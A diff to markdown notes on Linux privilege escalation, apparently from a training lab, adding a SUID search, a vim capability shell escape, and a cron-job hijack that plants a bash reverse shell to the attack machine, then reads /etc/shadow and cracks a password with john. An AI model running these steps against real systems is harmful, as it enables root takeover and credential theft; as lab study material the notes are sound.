@@ -68,11 +68,13 @@ have a higher chance of working successfully.
 5. Load a module, set the module options and `exploit`
 6. An exploit can fail for many reasons. If not works, try the next one or install missing components for it to run.
 
-### Sudo exploits
+### Sudo exploits find
 
 #### LD_PRELOAD
 
-`LD_PRELOAD` allows program to use/load shared libraries. If the `env_keep` option is enabled we can generate a 
+`LD_PRELOAD` allows program to 
+[use/load shared libraries](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/). 
+If the `env_keep` option is enabled we can generate a 
 shared library which will be loaded and executed before the program is run. The `LD_PRELOAD` option will be ignored 
 if the real user ID is different from the effective user ID.
 
@@ -129,9 +131,119 @@ uid=0(root) gid=0(root) groups=0(root)
 
 ### SUID exploits
 
-### Capabilities exploits
+To list files that have `SUID` or `SGID` bits set:
+
+```text
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+
+
+### Capabilities exploit vim
+
+To check for capable programs, use the `getcap` tool:
+```text
+karen@target:~$ getcap -r / 2>/dev/null
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/home/karen/vim = cap_setuid+ep
+/home/ubuntu/view = cap_setuid+ep
+```
+
+[Leverage vim](https://gtfobins.github.io/gtfobins/vim/) and execute a shell using python:
+
+```text
+vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+```
 
 ### Cron jobs exploits
+
+`ssh` into the target machine and look at `/etc/crontab`
+
+```text
+Last login: Sun Jun 20 10:17:43 2021 from 10.9.2.27
+$ cat /etc/crontab
+...
+#
+* * * * *  root /antivirus.sh
+* * * * *  root antivirus.sh
+* * * * *  root /home/karen/backup.sh
+* * * * *  root /tmp/test.py
+```
+
+Karen's backup script and test.py both run as root. Use either.
+
+On the attack machine start a listener:
+
+```text
+└─$ nc -lnvp 4444             
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+```
+
+Change the backup script:
+
+```text
+$ ls
+backup.sh
+$ mv backup.sh backup.sh.old
+$ touch backup.sh
+$ nano backup.sh
+```
+
+Put this code in:
+
+```text
+#!/bin/bash
+
+bash -i >& /dev/tcp/<IP address attack machine>/4444 0>&1
+```
+
+And make the script executable:
+
+```text
+$ chmod +x backup.sh
+```
+
+On the attack machine:
+
+```text
+└─# nc -lnvp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from <target IP address>.
+Ncat: Connection from <target IP address>:55932.
+bash: cannot set terminal process group (12785): Inappropriate ioctl for device
+bash: no job control in this shell
+root@target:~# python3 -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+root@target:~# cat /etc/shadow | grep matt
+cat /etc/shadow | grep matt
+matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.:18798:0:99999:7:::
+root@target:~# cat /etc/passwd | grep matt
+cat /etc/passwd | grep matt
+matt:x:1002:1002::/home/matt:/bin/sh
+```
+
+On the attack machine, copy matt's shadow in `shadow.txt` and matt's password in `password.txt`. Crack.
+
+```text
+$ unshadow passwd.txt shadow.txt > crackmatt.txt
+
+$ john --wordlist=/usr/share/wordlists/rockyou.txt crackmatt.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+123456           (matt)     
+1g 0:00:00:00 DONE (2022-09-25 23:30) 3.225g/s 3303p/s 3303c/s 3303C/s 123456..bethany
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
 
 ### Path exploits
 
@@ -168,6 +280,12 @@ Any user can check its current situation related to root privileges using the `s
 Use GTFObins for gathering information on how any program, on which a user may have sudo rights, can be used. 
 
 ### SUID exploits
+
+SUID (Set-user Identification) and SGID (Set-group Identification) allow files to be executed with the 
+permission level of the file owner or the group owner, respectively.
+
+Such files have an `s` bit set showing their special permission level. To find binaries known to be exploitable 
+when the SUID bit is set see [GTFObins SUID](https://gtfobins.github.io/#+suid).
 
 ### Capabilities exploits
 
